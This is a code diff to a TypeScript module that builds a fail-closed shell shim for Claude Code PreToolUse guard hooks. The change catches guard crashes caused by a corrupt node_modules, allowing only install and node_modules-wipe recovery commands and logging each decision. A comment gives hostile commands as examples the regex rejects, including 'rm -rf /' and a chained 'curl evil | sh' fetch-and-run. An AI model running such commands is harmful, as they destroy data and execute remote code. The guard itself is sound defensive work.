@@ -47,6 +47,29 @@ export const INSTALLER_ALLOW_ERE =
 export const INSTALLER_ALLOW_JS =
     /^(pnpm|npm)\s+(install|i)(\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*\s*$/;
 
+// The RECOVERY command, allowed alongside INSTALLER_ALLOW_ERE on every fail-closed path.
+//
+// Why a plain `pnpm install` is NOT enough (learned the hard way): when node_modules is CORRUPT — a
+// package half-written by an install that was killed mid-copy — pnpm sees a package dir carrying the
+// right version in its package.json, considers it installed, and SKIPS it. `pnpm install` cheerfully
+// reports "up to date" and the corruption survives every retry. The only reliable cure is to delete
+// node_modules so pnpm re-materializes the package from the (healthy) global store. So the fail-closed
+// escape hatch MUST allow the wipe too, or the assistant is left denying its own cure (deadlock).
+//
+// Kept as tight as INSTALLER_ALLOW_ERE: anchored at both ends, the ONLY shell operator accepted is a
+// single `&&` in exactly one position, and the rm target is literally `node_modules` — nothing else.
+// So `rm -rf /`, `rm -rf node_modules/../..`, `rm -rf node_modules; curl evil | sh` all stay DENIED.
+// Keep in sync with RECOVERY_ALLOW_JS below (locked by a unit test).
+export const RECOVERY_ALLOW_ERE =
+    '^rm[[:space:]]+-rf[[:space:]]+(\\./)?node_modules/?([[:space:]]*&&[[:space:]]*(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?[[:space:]]*$';
+
+// JS-regex twin of RECOVERY_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
+export const RECOVERY_ALLOW_JS =
+    /^rm\s+-rf\s+(\.\/)?node_modules\/?(\s*&&\s*(pnpm|npm)\s+(install|i)(\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?\s*$/;
+
+// The exact command we tell the human/assistant to run to recover a corrupt node_modules.
+export const RECOVERY_CMD = 'rm -rf node_modules && pnpm install';
+
 // Normal template literal (not String.raw): it carries #235's shell escapes verbatim (\${BIN_NAME},
 // \$REASON, \\n for the deny JSON) AND my sed backslashes (doubled: \\(, \\), \\1, [^"\\\\]). The
 // grep pattern is interpolated from INSTALLER_ALLOW_ERE (its value has no backslashes).
@@ -82,9 +105,101 @@ $(sed -n 's/.*"@webpieces\\/\\([A-Za-z0-9._-]*\\)"[[:space:]]*:[[:space:]]*"\\([
 WPEOF
 fi`;
 
-// Shell fragment: pick the fail-closed deny REASON — a version-drift message (bin present but stale)
-// vs the missing-bin message. Extracted alongside VERSION_DRIFT_GUARD_SH to keep renderShim() small.
-const DENY_REASON_SH = `if [ -n "\$DRIFT_PKG" ]; then
+// Shell fragment: run the installed guard bin and INSPECT its outcome, instead of exec'ing it.
+//
+// THE BUG THIS FIXES (guards silently fail-OPEN): the shim used to `exec "$BIN"`. exec REPLACES this
+// shim process, so once the bin was executable the shim was GONE and could no longer make a decision.
+// That is fine when the bin runs — but the bin can be INSTALLED YET BROKEN: a corrupt/partially-written
+// node_modules makes node die at require() time with MODULE_NOT_FOUND, exiting 1. And in the PreToolUse
+// protocol ONLY exit 2 blocks: any other non-zero is a NON-BLOCKING error, so Claude Code prints
+// "Failed with non-blocking status code" and RUNS THE TOOL CALL ANYWAY — the guard is silently skipped.
+// Result: every Write/Edit/Bash went UNGUARDED, for as long as node_modules stayed corrupt. The shim
+// handled "bin missing" and "bin stale", but never "bin present and CRASHES" — the third failure mode.
+//
+// So: do not exec. Run the bin with the payload on stdin and branch on its exit code.
+//   rc 0 | 2      → a REAL decision (allow / block). Relay stdout, stderr and the code byte-faithfully.
+//   anything else → the guard CRASHED. Fall through to the fail-CLOSED path (BROKEN_BIN=1).
+// stdout/stderr go through temp FILES, not $(command substitution), so the bin's bytes reach Claude
+// Code exactly as written — command substitution strips trailing newlines and would corrupt the
+// decision JSON. Reading the payload up-front ($PAYLOAD) is what replaces exec's stdin passthrough.
+const RUN_BIN_SH = `if [ -x "\$BIN" ] && [ -z "\$DRIFT_PKG" ]; then
+  OUT_FILE="\${TMPDIR:-/tmp}/wp-ai-hook-out.\$\$"
+  ERR_FILE="\${TMPDIR:-/tmp}/wp-ai-hook-err.\$\$"
+  printf '%s' "\$PAYLOAD" | "\$BIN" "\$@" >"\$OUT_FILE" 2>"\$ERR_FILE"
+  RC=\$?
+  if [ "\$RC" = 0 ] || [ "\$RC" = 2 ]; then
+    cat "\$OUT_FILE"                      # the guard's real decision — verbatim
+    cat "\$ERR_FILE" >&2
+    rm -f "\$OUT_FILE" "\$ERR_FILE" 2>/dev/null
+    exit "\$RC"
+  fi
+  # Crashed. Keep the most useful stderr line for the human. Strip " and backslash so the text stays a
+  # valid JSON string, and cap the length so a giant node stack cannot blow up the deny payload.
+  CRASH_MSG="\$(grep -m1 'Cannot find module' "\$ERR_FILE" 2>/dev/null | tr -d '"\\\\' | cut -c1-120)"
+  [ -n "\$CRASH_MSG" ] || CRASH_MSG="\$(head -n1 "\$ERR_FILE" 2>/dev/null | tr -d '"\\\\' | cut -c1-120)"
+  [ -n "\$CRASH_MSG" ] || CRASH_MSG="exit code \$RC, no stderr"
+  rm -f "\$OUT_FILE" "\$ERR_FILE" 2>/dev/null
+  BROKEN_BIN=1
+fi`;
+
+// Shell fragment: the guards are DOWN (missing | stale | crashed). Parse the payload, audit-log the
+// decision, and let ONLY the install/recovery commands through — everything else falls to the deny below.
+const TRIAGE_SH = `CMD="\$(printf '%s' "\$PAYLOAD" | sed -n 's/.*"command"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
+TOOL="\$(printf '%s' "\$PAYLOAD" | sed -n 's/.*"tool_name"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
+# Best-effort audit trail of every decision the fail-closed shim makes WHILE THE GUARDS ARE DOWN, so a
+# human can inspect after something odd (an install that was denied, or one that slipped through). One
+# tab-separated line per call → <root>/.webpieces/logs/ai-hook-shim.log (gitignored). NEVER breaks or
+# blocks the hook: all writes are best-effort (|| true) and go to a file, never to stdout (stdout is
+# the PreToolUse decision channel — a stray byte there would corrupt allow/deny).
+LOG_DIR="\$ROOT/.webpieces/logs"
+wp_log() {                   # \$1 = decision label (ALLOW-INSTALL | DENY | DENY-STALE | DENY-BROKEN)
+  { mkdir -p "\$LOG_DIR" 2>/dev/null && printf '%s\\t%s\\t%s\\t%s\\t%s\\n' "\$(date '+%Y-%m-%dT%H:%M:%S%z' 2>/dev/null)" "\$BIN_NAME" "\$TOOL" "\$1" "\$CMD" >> "\$LOG_DIR/ai-hook-shim.log"; } 2>/dev/null || true
+}
+DENY_LABEL="DENY"
+[ -n "\$DRIFT_PKG" ] && DENY_LABEL="DENY-STALE"    # version drift, not a missing bin
+[ -n "\$BROKEN_BIN" ] && DENY_LABEL="DENY-BROKEN"  # bin present but CRASHED (corrupt node_modules)
+if printf '%s' "\$CMD" | grep -Eq '${INSTALLER_ALLOW_ERE}' || printf '%s' "\$CMD" | grep -Eq '${RECOVERY_ALLOW_ERE}'; then
+  wp_log ALLOW-INSTALL       # record the self-heal we let through (re-enables the guards)
+  exit 0                     # allow the installer/recovery so the assistant can break the deadlock
+fi
+wp_log "\$DENY_LABEL"         # every fail-closed block (…-STALE = drift, …-BROKEN = crash) for inspection`;
+
+// Shell fragment: emit the deny. FAIL CLOSED via Claude Code's PreToolUse JSON protocol
+// (permissionDecision "deny" on stdout, then exit 0) rather than a bare "exit 2". BOTH block the call,
+// but the reason must be made VISIBLE, and HOW depends on the tool (verified by live tests; the docs
+// are wrong here):
+//   - Bash deny:  permissionDecisionReason is NOT shown to the human — ONLY a top-level systemMessage
+//                 is, and it honors ANSI. So for Bash we emit systemMessage wrapped in ANSI red so the
+//                 recovery command is visible (without it, on Bash, it is invisible).
+//   - Write/Edit/MultiEdit deny: permissionDecisionReason renders as a RED "Error:" block natively —
+//                 no systemMessage needed (a second line would be redundant).
+//   - NEVER exit 2 (stdout JSON ignored; stderr not reliably shown on a blocked Bash call).
+// The ESC is emitted as the literal 6-char JSON escape \\u001b (built via ${BS} so no raw ESC byte and
+// no \\uXXXX sits in this source); Claude Code's JSON parser turns \\u001b into ESC. The reason is a
+// single JSON string with no double-quotes/backslashes, so it stays valid JSON after ${BIN_NAME} subs.
+const DENY_EMIT_SH = `if [ "\$TOOL" = "Bash" ]; then
+  BS='\\'                     # one literal backslash, so the \\u001b escape never sits in this source
+  ESC="\${BS}u001b"          # the 6 chars: backslash u 0 0 1 b — Claude Code parses \\u001b → ESC
+  printf '{"systemMessage":"%s🛑 %s%s","hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"%s"}}\\n' "\${ESC}[31;1m" "\$REASON" "\${ESC}[0m" "\$REASON"
+else
+  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"%s"}}\\n' "\$REASON"
+fi
+exit 0                       # decision is carried by permissionDecision "deny", not the exit code`;
+
+// Shell fragment: pick the fail-closed deny REASON — a crashed-bin message (corrupt node_modules) vs a
+// version-drift message (bin present but stale) vs the missing-bin message. Extracted alongside
+// VERSION_DRIFT_GUARD_SH / RUN_BIN_SH to keep renderShim() within the method-line budget.
+const DENY_REASON_SH = `if [ -n "\$BROKEN_BIN" ]; then
+  # Report (do NOT auto-clean) the orphaned pnpm staging dirs — a package pnpm was mid-way through
+  # writing is left behind as <name>_<pid>_<hash>. Their presence is the fingerprint of an install that
+  # was killed, which is what corrupts node_modules in the first place. Best-effort; never fatal.
+  STAGING_N="\$(ls "\$ROOT/node_modules" 2>/dev/null | grep -Ec '_[0-9a-f]+_[0-9a-f]+\$' || true)"
+  STAGING_NOTE=""
+  if [ "\${STAGING_N:-0}" -gt 0 ] 2>/dev/null; then
+    STAGING_NOTE=" Also found \$STAGING_N orphaned pnpm staging dirs (name_pid_hash) under node_modules - the fingerprint of an install that was killed mid-write."
+  fi
+  REASON="❌ webpieces guards are DOWN and every tool call is BLOCKED: \${BIN_NAME} is installed but CRASHED (\$CRASH_MSG). Your node_modules is corrupt or partially written, so the guards cannot run - and they must NOT be silently skipped. NOTE: a plain 'pnpm install' will NOT fix this; pnpm sees the correct version on disk and skips the broken package. Run exactly this, then retry: ${RECOVERY_CMD}\${STAGING_NOTE}"
+elif [ -n "\$DRIFT_PKG" ]; then
   REASON="❌ webpieces is out of date: package.json pins \$DRIFT_PKG@\$DRIFT_DECLARED but node_modules has \$DRIFT_INSTALLED. This hook rejects every call except 'pnpm install' because your installed webpieces is older than webpieces.config.json requires. Please run 'pnpm install' now, then retry."
 else
   REASON="❌ @webpieces/ai-hook-rules is declared in package.json but is not installed (\${BIN_NAME} not found). Run 'pnpm install' (or this repo's installer) to enable the webpieces AI guards, then retry. (If you removed @webpieces/ai-hook-rules on purpose, delete its hooks from .claude/settings.json.)"
@@ -105,56 +220,21 @@ shift
 ROOT="$(CDPATH= cd -- "$(dirname -- "$0")/../.." && pwd)"
 BIN="$ROOT/node_modules/.bin/$BIN_NAME"
 ${VERSION_DRIFT_GUARD_SH}
-if [ -x "$BIN" ] && [ -z "$DRIFT_PKG" ]; then
-  exec "$BIN" "$@"          # exec preserves stdin — hooks receive the tool payload as JSON on stdin
-fi
-# Bin missing (fresh clone before install, or a broken install) OR a version drift (stale node_modules).
-# The webpieces guards CANNOT safely run.
-# Before failing closed, peek at the tool payload and let ONLY package-manager install commands
-# through: the assistant's own Bash tool routes through this hook too, so blocking everything would
-# deadlock the one command (pnpm/npm install) that re-enables the guards. A silent exit 0 = "allow"
-# in the PreToolUse protocol; the guards resume automatically once node_modules is present.
+# Read the tool payload ONCE, up front. The shim no longer exec's the bin (see RUN_BIN_SH), so it must
+# forward stdin to the bin itself — and it needs the payload again on the fail-closed path below.
 PAYLOAD="$(cat)"
-CMD="$(printf '%s' "$PAYLOAD" | sed -n 's/.*"command"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
-TOOL="$(printf '%s' "$PAYLOAD" | sed -n 's/.*"tool_name"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
-# Best-effort audit trail of every decision the fail-closed shim makes WHILE THE GUARDS ARE DOWN, so a
-# human can inspect after something odd (an install that was denied, or one that slipped through). One
-# tab-separated line per call → <root>/.webpieces/logs/ai-hook-shim.log (gitignored). NEVER breaks or
-# blocks the hook: all writes are best-effort (|| true) and go to a file, never to stdout (stdout is
-# the PreToolUse decision channel — a stray byte there would corrupt allow/deny).
-LOG_DIR="$ROOT/.webpieces/logs"
-wp_log() {                   # $1 = decision label (ALLOW-INSTALL | DENY)
-  { mkdir -p "$LOG_DIR" 2>/dev/null && printf '%s\\t%s\\t%s\\t%s\\t%s\\n' "$(date '+%Y-%m-%dT%H:%M:%S%z' 2>/dev/null)" "$BIN_NAME" "$TOOL" "$1" "$CMD" >> "$LOG_DIR/ai-hook-shim.log"; } 2>/dev/null || true
-}
-DENY_LABEL="DENY"
-[ -n "$DRIFT_PKG" ] && DENY_LABEL="DENY-STALE"   # version drift, not a missing bin
-if printf '%s' "$CMD" | grep -Eq '${INSTALLER_ALLOW_ERE}'; then
-  wp_log ALLOW-INSTALL       # record the self-heal we let through (re-enables the guards)
-  exit 0                     # allow the installer so the assistant can self-heal the deadlock
-fi
-wp_log "$DENY_LABEL"         # record every fail-closed block (…-STALE = version drift) for inspection
-# Not an installer command → FAIL CLOSED. Deny via Claude Code's PreToolUse JSON protocol
-# (permissionDecision "deny" on stdout, then exit 0) rather than a bare "exit 2". BOTH block the call,
-# but the reason must be made visible, and HOW depends on the tool (verified by live tests; the docs
-# are wrong here):
-#   - Bash deny:  permissionDecisionReason is NOT shown to the human — ONLY a top-level systemMessage
-#                 is, and it honors ANSI. So for Bash we emit systemMessage wrapped in ANSI red so the
-#                 "run pnpm install" fix is visible (today, on Bash, it is invisible).
-#   - Write/Edit/MultiEdit deny: permissionDecisionReason renders as a RED "Error:" block natively —
-#                 no systemMessage needed (a second line would be redundant).
-#   - NEVER exit 2 (stdout JSON ignored; stderr not reliably shown on a blocked Bash call).
-# The ESC is emitted as the literal 6-char JSON escape \\u001b (built via \${BS} so no raw ESC byte and
-# no \\uXXXX sits in this source); Claude Code's JSON parser turns \\u001b into ESC. The reason is a
-# single JSON string with no double-quotes/backslashes, so it stays valid JSON after \${BIN_NAME} subs.
+BROKEN_BIN=""
+CRASH_MSG=""
+${RUN_BIN_SH}
+# Bin missing (fresh clone before install) OR a version drift (stale node_modules) OR the bin is
+# installed but CRASHED (corrupt node_modules). The webpieces guards CANNOT safely run.
+# Before failing closed, peek at the tool payload and let ONLY package-manager install/recovery commands
+# through: the assistant's own Bash tool routes through this hook too, so blocking everything would
+# deadlock the very commands (pnpm install / rm -rf node_modules && pnpm install) that re-enable the
+# guards. A silent exit 0 = "allow" in the PreToolUse protocol; the guards resume once the tree is sane.
+${TRIAGE_SH}
 ${DENY_REASON_SH}
-if [ "\$TOOL" = "Bash" ]; then
-  BS='\\'                     # one literal backslash, so the \\u001b escape never sits in this source
-  ESC="\${BS}u001b"          # the 6 chars: backslash u 0 0 1 b — Claude Code parses \\u001b → ESC
-  printf '{"systemMessage":"%s🛑 %s%s","hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"%s"}}\\n' "\${ESC}[31;1m" "\$REASON" "\${ESC}[0m" "\$REASON"
-else
-  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"%s"}}\\n' "\$REASON"
-fi
-exit 0                       # decision is carried by permissionDecision "deny", not the exit code
+${DENY_EMIT_SH}
 `;
 }
 
